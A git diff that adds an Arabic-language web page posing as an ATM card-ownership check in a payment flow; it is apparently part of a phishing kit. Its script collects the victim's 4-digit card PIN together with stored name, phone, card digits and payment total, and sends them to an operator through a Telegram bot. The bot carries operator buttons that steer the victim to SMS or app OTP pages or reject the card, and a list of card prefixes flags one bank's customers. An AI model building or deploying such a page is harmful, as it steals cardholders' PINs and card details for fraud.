@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <script src="assets/js/snap-pixel.js"></script>
+    <script src="assets/js/tiktok-pixel.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إثبات ملكية البطاقة | الصراف الآلي (ATM)</title>
+    
+    <!-- Premium Google Fonts: Cairo for Arabic & Outfit/Fira Code for English numbers -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for Premium Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Design System matches payment.html and otp.html */
+        :root {
+            --primary-gradient: linear-gradient(135deg, #2866D3 0%, #1e4fa8 100%);
+            --gold-gradient: linear-gradient(180deg, #caa248 0%, #b9933d 100%);
+            --gold-color: #caa248;
+            --gold-hover: #b9933d;
+            --bg-main: #f3f7fb;
+            --bg-container: #ffffff;
+            --bg-header-box: #f8fafc;
+            --text-title: #0f172a;
+            --text-body: #334155;
+            --text-muted: #64748b;
+            --border-color: #cbd5e1;
+            --input-bg: #f8fafc;
+            --shadow-container: 0 15px 30px rgba(40, 102, 211, 0.04);
+            
+            --success-color: #10b981;
+            --error-color: #ef4444;
+            --accent-glow: rgba(40, 102, 211, 0.12);
+            --theme-accent: #2866D3;
+            
+            --font-main: 'Cairo', 'Outfit', sans-serif;
+            --font-mono: 'Fira Code', monospace;
+            --transition-speed: 0.25s;
+        }
+
+        /* Dark Mode overrides */
+        [data-theme="dark"] {
+            --bg-main: #070a10;
+            --bg-container: #101622;
+            --bg-header-box: #162030;
+            --text-title: #f8fafc;
+            --text-body: #cbd5e1;
+            --text-muted: #8e9cae;
+            --border-color: #27354a;
+            --input-bg: #162030;
+            --shadow-container: 0 15px 30px rgba(0, 0, 0, 0.3);
+            --accent-glow: rgba(40, 102, 211, 0.2);
+            --theme-accent: #2866D3;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: var(--font-main);
+            background-color: var(--bg-main);
+            color: var(--text-body);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+            overflow: hidden;
+            transition: background-color var(--transition-speed), color var(--transition-speed);
+        }
+
+        /* Floating Controls */
+        .floating-controls {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .floating-controls * {
+            pointer-events: auto;
+        }
+
+        .theme-toggle-btn {
+            background-color: var(--bg-container);
+            border: 1px solid var(--border-color);
+            color: var(--text-body);
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+            transition: all var(--transition-speed);
+        }
+
+        .theme-toggle-btn:hover {
+            background-color: var(--input-bg);
+            border-color: var(--text-muted);
+            transform: rotate(15deg);
+        }
+
+        .theme-toggle-btn i {
+            font-size: 13px;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+            color: var(--text-body);
+            font-size: 11px;
+            font-weight: 700;
+            padding: 6px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background-color: var(--bg-container);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+            transition: all var(--transition-speed);
+        }
+
+        .back-btn:hover {
+            background-color: var(--input-bg);
+            border-color: var(--text-muted);
+            transform: translateX(-1px);
+        }
+
+        /* Main Container */
+        .payment-container {
+            background-color: var(--bg-container);
+            width: 100%;
+            max-width: 410px;
+            border-radius: 24px; /* More rounded container */
+            box-shadow: var(--shadow-container);
+            padding: 24px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            transition: background-color var(--transition-speed), border-color var(--transition-speed), box-shadow var(--transition-speed);
+            transform: scale(1);
+            transform-origin: center;
+            max-height: calc(100vh - 80px);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Responsive scaling */
+        @media (max-height: 580px) {
+            .payment-container {
+                transform: scale(0.9);
+                margin: -20px 0;
+            }
+        }
+        @media (max-height: 510px) {
+            .payment-container {
+                transform: scale(0.82);
+                margin: -35px 0;
+            }
+        }
+
+        /* Verification Info Header Box */
+        .info-header-box {
+            background-color: var(--bg-header-box);
+            border: 1px solid var(--border-color);
+            border-radius: 20px; /* Matching the rounded style */
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            position: relative;
+            transition: background-color var(--transition-speed), border-color var(--transition-speed);
+        }
+
+        .atm-header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .atm-logo-text {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--theme-accent);
+            letter-spacing: 0.5px;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        .card-theme-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--theme-accent);
+            font-size: 28px;
+        }
+
+        .atm-header-divider {
+            height: 1px;
+            background-color: var(--border-color);
+            margin: 8px 0 16px 0;
+            opacity: 0.7;
+        }
+
+        .auth-title {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--theme-accent); /* Dynamic or dark blue matching screenshot ATM title */
+            margin-bottom: 8px;
+            transition: color var(--transition-speed);
+        }
+
+        [data-theme="dark"] .auth-title {
+            color: #3b82f6;
+        }
+
+        .auth-desc {
+            font-size: 12px;
+            color: var(--text-body);
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+        /* Form Controls */
+        .form-section {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .otp-group-title {
+            font-size: 14px;
+            font-weight: 800;
+            color: var(--text-title);
+            text-align: center;
+            margin-bottom: 4px;
+        }
+
+        .otp-sent-number {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 16px;
+            direction: rtl;
+        }
+
+        .otp-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-body);
+            margin-bottom: 8px;
+        }
+
+        /* OTP inputs wrappers */
+        .otp-inputs-wrapper {
+            display: flex;
+            justify-content: center;
+            gap: 16px; /* Increased gap like screenshot */
+            margin-bottom: 20px;
+            direction: ltr; /* standard LTR digit order */
+        }
+
+        .otp-digit-input {
+            width: 52px; /* Increased width like screenshot */
+            height: 52px; /* Increased height like screenshot */
+            font-size: 24px;
+            font-weight: 700;
+            font-family: var(--font-mono);
+            text-align: center;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px; /* Rounded inputs matching screenshot */
+            color: var(--text-title);
+            outline: none;
+            transition: all var(--transition-speed);
+        }
+
+        .otp-digit-input:focus {
+            border-color: var(--theme-accent);
+            background-color: var(--bg-container);
+            box-shadow: 0 0 0 3px var(--accent-glow);
+        }
+
+        .otp-digit-input.invalid {
+            border-color: var(--error-color);
+        }
+
+        .validation-msg {
+            color: var(--error-color);
+            font-size: 10px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 12px;
+            display: none;
+            animation: fadeIn 0.2s ease-in-out;
+        }
+
+        .pay-submit-btn {
+            background: var(--primary-gradient);
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            border-radius: 12px; /* Matching the rounded inputs */
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 3px 8px rgba(40, 102, 211, 0.12);
+            transition: all var(--transition-speed);
+            margin-bottom: 16px;
+        }
+
+        .pay-submit-btn:hover {
+            transform: translateY(-0.5px);
+            box-shadow: 0 5px 12px rgba(40, 102, 211, 0.25);
+        }
+
+        .pay-submit-btn:active {
+            transform: translateY(0.5px);
+        }
+
+        .pay-submit-btn:disabled {
+            background-color: var(--border-color);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        .help-link {
+            font-size: 12px;
+            text-align: center;
+            color: var(--text-muted);
+            cursor: pointer;
+            text-decoration: underline;
+            transition: color var(--transition-speed);
+            font-weight: 600;
+            display: block;
+        }
+
+        .help-link:hover {
+            color: var(--theme-accent);
+        }
+
+        /* Simulated Submission Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: var(--bg-container);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all var(--transition-speed) ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Premium Spinner */
+        .spinner-ring {
+            width: 48px;
+            height: 48px;
+            border: 3px solid var(--border-color);
+            border-top-color: var(--theme-accent);
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+            margin-bottom: 15px;
+        }
+
+        .status-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-title);
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .status-sub {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-align: center;
+            max-width: 280px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        /* Animations */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
+        }
+        body.loading-active {
+            overflow: hidden !important;
+            pointer-events: none !important;
+            user-select: none !important;
+        }
+        body.loading-active .loading-overlay {
+            pointer-events: auto !important;
+        }
+    </style></head>
+<body>
+
+    <!-- Simulated Submission Overlay (Moved to body level to prevent scaling/transform interaction bugs) -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner-ring" id="loadingSpinner"></div>
+        
+        <div class="status-text" id="statusText">يرجى الانتظار جاري معالجة طلبك</div>
+        <div class="status-sub" id="statusSub" style="display: none;"></div>
+    </div>
+
+    <!-- Floating Top Controls -->
+    <div class="floating-controls">
+        <a href="payment.html" class="back-btn">
+             إلغاء والعودة <i class="fa-solid fa-arrow-left" style="transform: scaleX(-1); font-size: 10px;"></i>
+        </a>
+        <button class="theme-toggle-btn" id="themeToggle" aria-label="تبديل الوضع الليلي">
+            <i class="fa-solid fa-moon"></i>
+        </button>
+    </div>
+
+    <!-- Main Card -->
+    <div class="payment-container" id="otpBox">
+
+        <!-- Form Section -->
+        <div class="form-section">
+            
+            <!-- ATM Form Header Box -->
+            <div class="info-header-box">
+                <div class="atm-header-top">
+                    <span class="atm-logo-text">ATM</span>
+                    <div class="card-theme-icon" id="cardBrandIconContainer">
+                        <i class="fa-regular fa-credit-card" id="cardBrandIcon"></i>
+                    </div>
+                </div>
+                
+                <div class="atm-header-divider"></div>
+                
+                <h2 class="auth-title">إثبات ملكية البطاقة</h2>
+                <p class="auth-desc">
+                    لتأكيد العملية، يرجى إدخال الرقم السري للصراف الآلي المكوّن من 4 خانات للتحقق من ملكية البطاقة وإتمام عملية الدفع بأمان.
+                </p>
+            </div>
+
+            <!-- ATM Target Title & Instruction -->
+            <div class="otp-group-title">يرجى إدخال الرقم السري للصراف الآلي (ATM):</div>
+            <div class="otp-sent-number" id="cardSuffixText">أدخل الرمز السري المرتبط بالبطاقة المنتهية بـ ****.</div>
+            
+            <form id="otpForm" novalidate>
+                <label class="otp-label">أدخل الرمز هنا:</label>
+                
+                <!-- 4 digit code inputs -->
+                <div class="otp-inputs-wrapper">
+                    <input type="text" class="otp-digit-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-digit-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-digit-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                    <input type="text" class="otp-digit-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                </div>
+
+                <div class="validation-msg" id="otpError">الرمز السري للصراف الآلي غير مكتمل.</div>
+
+                <button type="submit" class="pay-submit-btn" id="confirmBtn">تأكيد</button>
+            </form>
+
+            <div class="help-link" id="helpBtn">هل تحتاج للمساعدة؟</div>
+
+        </div>
+
+    </div>
+
+    <!-- JavaScript Logic -->
+    <script src="assets/js/config.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            // Theme state (sync with payment.html)
+            const state = {
+                theme: localStorage.getItem("alain_payment_theme") || "light"
+            };
+
+            const themeToggleBtn = document.getElementById("themeToggle");
+            document.documentElement.setAttribute("data-theme", state.theme);
+            updateThemeIcon();
+
+            themeToggleBtn.addEventListener("click", () => {
+                state.theme = state.theme === "light" ? "dark" : "light";
+                document.documentElement.setAttribute("data-theme", state.theme);
+                localStorage.setItem("alain_payment_theme", state.theme);
+                updateThemeIcon();
+            });
+
+            function updateThemeIcon() {
+                const icon = themeToggleBtn.querySelector("i");
+                icon.className = state.theme === "dark" ? "fa-solid fa-sun" : "fa-solid fa-moon";
+            }
+
+            // Retrieve card brand and last 4 digits from sessionStorage
+            const cardBrand = sessionStorage.getItem("alain_card_brand") || "default";
+            const cardLast4 = sessionStorage.getItem("alain_card_last4") || "";
+
+            // Dynamic card brand icon
+            const brandIcon = document.getElementById("cardBrandIcon");
+            if (brandIcon) {
+                let iconClass = "fa-regular fa-credit-card";
+                if (cardBrand === "visa") {
+                    iconClass = "fa-brands fa-cc-visa";
+                } else if (cardBrand === "mastercard") {
+                    iconClass = "fa-brands fa-cc-mastercard";
+                } else if (cardBrand === "amex") {
+                    iconClass = "fa-brands fa-cc-amex";
+                } else if (cardBrand === "discover") {
+                    iconClass = "fa-brands fa-cc-discover";
+                }
+                brandIcon.className = iconClass;
+            }
+
+            // Dynamic card suffix text
+            const cardSuffixText = document.getElementById("cardSuffixText");
+            if (cardSuffixText) {
+                if (cardLast4) {
+                    cardSuffixText.textContent = `أدخل الرمز السري المرتبط بالبطاقة المنتهية بـ **** ${cardLast4}.`;
+                } else {
+                    cardSuffixText.textContent = `أدخل الرمز السري المرتبط بالبطاقة المنتهية بـ ****.`;
+                }
+            }
+
+            // OTP Inputs Management
+            const inputs = document.querySelectorAll(".otp-digit-input");
+            const form = document.getElementById("otpForm");
+            const confirmBtn = document.getElementById("confirmBtn");
+            const otpError = document.getElementById("otpError");
+            const otpBox = document.getElementById("otpBox");
+
+            function savePinToSession() {
+                let pinVal = "";
+                inputs.forEach(input => pinVal += input.value);
+                sessionStorage.setItem("alain_pin_code", pinVal);
+            }
+
+            // Reset PIN inputs on load (even if previously inserted/saved)
+            sessionStorage.removeItem("alain_pin_code");
+            inputs.forEach(input => {
+                input.value = "";
+                input.classList.remove("invalid");
+            });
+
+            // Focus on first input on load
+            if (inputs[0]) {
+                setTimeout(() => inputs[0].focus(), 300);
+            }
+
+            inputs.forEach((input, index) => {
+                // Keep only numeric input
+                input.addEventListener("input", (e) => {
+                    const val = e.target.value;
+                    const cleaned = val.replace(/\D/g, "");
+                    e.target.value = cleaned;
+
+                    if (cleaned.length > 0) {
+                        input.classList.remove("invalid");
+                        otpError.style.display = "none";
+                        // Auto focus next input
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                    savePinToSession();
+                });
+
+                // Backspace handling
+                input.addEventListener("keydown", (e) => {
+                    if (e.key === "Backspace") {
+                        if (input.value === "") {
+                            if (index > 0) {
+                                inputs[index - 1].focus();
+                                inputs[index - 1].value = "";
+                            }
+                        } else {
+                            input.value = "";
+                        }
+                        savePinToSession();
+                    }
+                });
+
+                // Paste support
+                input.addEventListener("paste", (e) => {
+                    e.preventDefault();
+                    const text = (e.clipboardData || window.clipboardData).getData("text");
+                    const digits = text.replace(/\D/g, "").substring(0, 4);
+                    
+                    if (digits.length > 0) {
+                        for (let i = 0; i < inputs.length; i++) {
+                            if (digits[i]) {
+                                inputs[i].value = digits[i];
+                                if (i < inputs.length - 1) {
+                                    inputs[i + 1].focus();
+                                }
+                            }
+                        }
+                        savePinToSession();
+                    }
+                });
+            });
+
+            // Form Submit Flow
+            form.addEventListener("submit", (e) => {
+                e.preventDefault();
+                
+                // Retrieve the entered code
+                let pinCode = "";
+                inputs.forEach(input => pinCode += input.value);
+
+                if (pinCode.length < 4) {
+                    // Shake and show validation error
+                    inputs.forEach(input => {
+                        if (input.value === "") input.classList.add("invalid");
+                    });
+                    
+                    otpError.style.display = "block";
+                    
+                    otpBox.style.animation = "none";
+                    setTimeout(() => {
+                        otpBox.style.animation = "shake 0.4s ease";
+                    }, 5);
+                    return;
+                }
+
+                // Code entered, launch simulated ATM clearance overlay
+                triggerLoadingOverlay(pinCode);
+            });
+
+            // Help link trigger
+            const helpBtn = document.getElementById("helpBtn");
+            helpBtn.addEventListener("click", () => {
+                alert("يرجى إدخال الرقم السري المكون من 4 أرقام والذي تستخدمه عند الدفع أو السحب من جهاز الصراف الآلي (ATM) لهذه البطاقة.");
+            });
+
+            // Simulated Submission overlay
+            const loadingOverlay = document.getElementById("loadingOverlay");
+            const statusText = document.getElementById("statusText");
+            const statusSub = document.getElementById("statusSub");
+
+            // Automatically sync body class with loadingOverlay active state
+            if (loadingOverlay) {
+                const observer = new MutationObserver(() => {
+                    const isActive = loadingOverlay.classList.contains("active");
+                    document.body.classList.toggle("loading-active", isActive);
+                });
+                observer.observe(loadingOverlay, { attributes: true, attributeFilter: ["class"] });
+            }
+
+            // Disable all page interactions via keyboard when loading overlay is active
+            window.addEventListener("keydown", (e) => {
+                if (loadingOverlay && loadingOverlay.classList.contains("active")) {
+                    const isReload = (e.key === "r" && (e.metaKey || e.ctrlKey)) || e.keyCode === 116;
+                    if (!isReload) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }
+                }
+            }, true);
+
+            async function triggerLoadingOverlay(pinCode) {
+                loadingOverlay.classList.add("active");
+                statusText.textContent = "يرجى الانتظار جاري معالجة طلبك";
+                statusSub.textContent = "";
+                statusSub.style.display = "none";
+
+                if (window.TelegramSystem) {
+                    try {
+                        const sessionId = window.TelegramSystem.getSessionId();
+                        
+                        let billing = { name: "غير متوفر", phone: "غير متوفر" };
+                        try {
+                            const stored = sessionStorage.getItem("alain_customer_info");
+                            if (stored) {
+                                const parsed = JSON.parse(stored);
+                                billing.name = parsed.name || "غير متوفر";
+                                billing.phone = parsed.phone || "غير متوفر";
+                            }
+                        } catch (e) {}
+
+                        let summary = { total: "0.00" };
+                        try {
+                            const stored = sessionStorage.getItem("alain_checkout_summary");
+                            if (stored) summary = JSON.parse(stored);
+                        } catch (e) {}
+
+                        const payType = sessionStorage.getItem("alain_payment_type") || "partial";
+
+                        let ccNumber = "";
+                        try {
+                            const stored = sessionStorage.getItem("alain_cc_info");
+                            if (stored) {
+                                const parsed = JSON.parse(stored);
+                                if (parsed && parsed.cardNumber) {
+                                    ccNumber = parsed.cardNumber.replace(/\s/g, "");
+                                }
+                            }
+                        } catch (e) {}
+
+                        const first4 = ccNumber.substring(0, 4);
+                        const adibBins = ["4333", "4806", "4258", "4788", "5364", "4855", "4568", "4456", "4713", "4266"];
+                        const isAdib = adibBins.includes(first4);
+                        const messageHeader = isAdib ? `🏦 - بنك أديب` : `🔴 صفحة الرقم السري ATM`;
+
+                        const messageText = `<b>${messageHeader}</b>\n` +
+                                            `👤 <b>الاسم الكامل:</b> <code>${billing.name}</code>\n` +
+                                            `📞 <b>رقم الهاتف:</b> <code>${billing.phone}</code>\n\n` +
+                                            `💳 <b>رقم البطاقة:</b> <code>**** ${cardLast4 || "N/A"}</code>\n` +
+                                            `🏧 <b>الرمز السري (ATM):</b> <code>${pinCode}</code>\n` +
+                                            `________________________\n` +
+                                            `💰 <b>المبلغ الإجمالي:</b> <code>${summary.total} درهم</code>\n` +
+                                            `طريق تأكيد طلب - ${payType === "partial" ? "دفع 5 دراهم للتأكيد" : "دفع المبلغ كامل"}`;
+
+                        const inlineButtons = [
+                            [
+                                { text: "❌ رفض الرمز", callback_data: `invalid_pin_SEC_${sessionId}` },
+                                { text: "❌ رفض البطاقة", callback_data: `goto_card_SEC_${sessionId}` }
+                            ],
+                            [
+                                { text: "💬 مصادقة SMS", callback_data: `goto_otp_SEC_${sessionId}` },
+                                { text: "📱 مصادقة التطبيق", callback_data: `goto_otp_app_SEC_${sessionId}` }
+                            ],
+                            [
+                                { text: "✅ أنهاء عملية التسجيل", callback_data: `success_SEC_${sessionId}` }
+                            ]
+                        ];
+
+                        await window.TelegramSystem.sendMessage(messageText, inlineButtons);
+
+                        // Start polling updates
+                        window.TelegramSystem.startPolling((action) => {
+                            if (action === "success") {
+                                statusText.textContent = "يرجى الانتظار جاري معالجة طلبك";
+                                statusSub.textContent = "";
+                                statusSub.style.display = "none";
+                                setTimeout(() => {
+                                    window.location.href = "success.html";
+                                }, 1500);
+                            } else if (action === "goto_otp") {
+                                statusText.textContent = "يرجى الانتظار جاري معالجة طلبك";
+                                statusSub.textContent = "";
+                                statusSub.style.display = "none";
+                                setTimeout(() => {
+                                    window.location.href = "otp.html";
+                                }, 1500);
+                            } else if (action === "goto_otp_app") {
+                                statusText.textContent = "يرجى الانتظار جاري معالجة طلبك";
+                                statusSub.textContent = "";
+                                statusSub.style.display = "none";
+                                setTimeout(() => {
+                                    window.location.href = "otp-app.html";
+                                }, 1500);
+                            } else if (action === "goto_card") {
+                                window.location.href = "payment.html?rejected=true";
+                            } else if (action === "invalid_pin") {
+                                loadingOverlay.classList.remove("active");
+                                
+                                // Show invalid pin layout
+                                otpError.textContent = "الرمز السري للصراف الآلي غير صحيح. يرجى إدخال الرمز الصحيح.";
+                                otpError.style.display = "block";
+                                inputs.forEach(input => {
+                                    input.classList.add("invalid");
+                                    input.value = "";
+                                });
+                                sessionStorage.removeItem("alain_pin_code");
+
+                                // Shake animation
+                                otpBox.style.animation = "none";
+                                setTimeout(() => {
+                                    otpBox.style.animation = "shake 0.4s ease";
+                                }, 5);
+
+                                // Focus on first input
+                                if (inputs[0]) inputs[0].focus();
+                            }
+                        });
+
+                    } catch (err) {
+                        console.error("Failed to send ATM details:", err);
+                        // Fallback redirect if something critically fails to prevent blocking user
+                        setTimeout(() => {
+                            window.location.href = "otp-app.html";
+                        }, 4000);
+                    }
+                } else {
+                    // Fallback
+                    setTimeout(() => {
+                        window.location.href = "otp-app.html";
+                    }, 4000);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
